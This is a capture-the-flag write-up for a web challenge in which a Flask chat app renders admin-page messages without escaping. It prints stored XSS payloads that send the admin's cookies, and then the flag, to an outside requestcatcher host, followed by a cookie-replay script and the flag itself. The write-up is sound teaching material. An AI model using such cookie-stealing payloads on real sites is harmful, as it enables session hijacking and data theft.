# HackChatAI \[388 points\] (6 solves)

> Why rely on humans for conversation when AI can handle it for you?

### Files:
[src.zip](/web/HackChatAI/src)

This challenge gives us a Flask chat app which allows us to communicate with a GPT-4o model and optionally request a human. Requesting a human spins up a Selenium webdriver and visits the `/admin` chat, but nothing is returned from there.

## The Attack Vector

The goal is pretty obvious: steal the admin's cookie, log in to `/admin` and get the flag from the admin chat.

Since this is a Flask app, the biggest thing that I was looking for was if the challenge disabled autoescaping. Autoescaping is done by default by Flask, and it ensures that anything dynamically loaded via templates into our HTML is treated like plain text, not as HTML. If the challenge turns autoescaping off, we will be able to perform basic XSS attacks to exfiltrate data from the admin. Yet, if we look at our `index.html` file, we can see that there aren't any `| safe` operators (these would turn off autoescaping and allow for our messages to be parsed as HTML):

```html
    <h2>Chat Page</h2>
    <div class="messages" id="messages">
        {% for message, is_response in chat_history %}
            <div>{{ 'Server: ' if is_response else 'You: ' }}{{ message }}</div>
        {% endfor %}
    </div>
```

I was stuck here for most of the challenge. If I'm not able to inject code, how can I steal the flag from the admin?

In this case, my mistake was the assumption that our Selenium instance is visiting the same chat as I was. The Selenium instance actually visits the `/admin` page with an admin cookie, which is what we're trying to steal. 

> [!NOTE]
> The Selenium instance only starts up when you write `I need a human` in the chat

If we look at the admin page:

```html
    <h3>Chat History</h3>
    <div class="chat-history">
        {% for chat in chat_history %}
        <div class="chat-message">
            <div class="chat-date">{{ chat[0]|safe }}</div>
        </div>
        {% endfor %}
    </div>
```

We can see that all of our messages have autoescaping turned off, allowing for us to use XSS to steal the admin account.

When tinkering with different XSS attacks, the biggest deterrent I found was this error I:

![console fetch error](/web/HackChatAI/solution/cors_error.png)

I thought this meant that I wasn't able to POST the data, so I started considering exfiltrating data with WebRTC and DNS out-of-bound interactions. But, if you read the error carefully, it's specifying that the *response* is being blocked, not the *request*, which means that our data is being sent, but any response we get will be blocked by CORS. That doesn't matter, because we're not returning anything from the request.


## Execution

Here is my basic XSS attack to exfiltrate the cookie from the admin:

```js
<script>
    fetch("https://hackbox.requestcatcher.com", { 
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: document.cookie
    });
</script>
```
<details>
<summary>Minified</summary>

```html
<script>fetch("https://hackbox.requestcatcher.com", { method: "POST", headers: { "Content-Type": "text/plain" }, body: document.cookie });</script>
```

</details>

In this POST request, I used [`requestcatcher`](https://requestcatcher.com/) to see all `POST`ed data, mainly because it's free and unblocked on my school's WiFi. Once I input the XSS into the chat and requested a human, we get `POST`ed data of the admin cookies:

![cookies from admin](/web/HackChatAI/solution/stolen_cookies.png)

So, this was the final script to get the admin page:
```py
import requests

url = "https://ictf24-high-hackchatai.chals.io/admin"
cookies = {
    "admin_cookie": "NBtL78S9MCdb8sOC",
    "play_token": "2ht823oPJa5jPrcy"
}

response = requests.get(url, cookies=cookies)

print(response.text)
```


Resulting in the HTML page of the admin containing the flag:
```
...
<h2>Welcome, Admin!</h2>
<h3>ictf{well_d0n3_on_s0lv1ng_th1s_ch4ll3ng3_hackchatai24}</h3>
...
```

### Alternate solution

However, it's actually easier to ignore the admin cookie altogether and simply steal the flag, since it's loaded on the admin page regardless:

![admin page](/web/HackChatAI/solution/admin_console_selenium.png)

This flag in an H3 element, which we can steal by parsing through all H3s that start with `ictf` (the flag format):

```html
<script>
    fetch("https://hackchatai.requestcatcher.com", {
        method: "POST",
        headers: {
            "Content-Type": "text/plain"
        },
        body: Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim().startsWith('ictf')).textContent
    });
</script>
```

<details>
<summary>Minified</summary>

```html
<script>fetch("https://hackchatai.requestcatcher.com", {method: "POST", headers: {"Content-Type": "text/plain"}, body: Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim().startsWith('ictf')).textContent.trim() || 'invalid'});</script>
```

</details>

<br>

We get a POST request like this:

![final post req](/web/HackChatAI/solution/request_catcher_post.png)

Giving us the flag.

```
ictf{well_d0n3_on_s0lv1ng_th1s_ch4ll3ng3_hackchatai24}
```

## Conclusion

I really enjoyed this challenge. It reminded me of PicoCTF 2024's hardest web challenge, `elements`, given that both of the challenges allowed the user to execute code in an automated web browser to exfiltrate the flag. This wasn't too hard, and was a nice practice problem in the middle of the competition.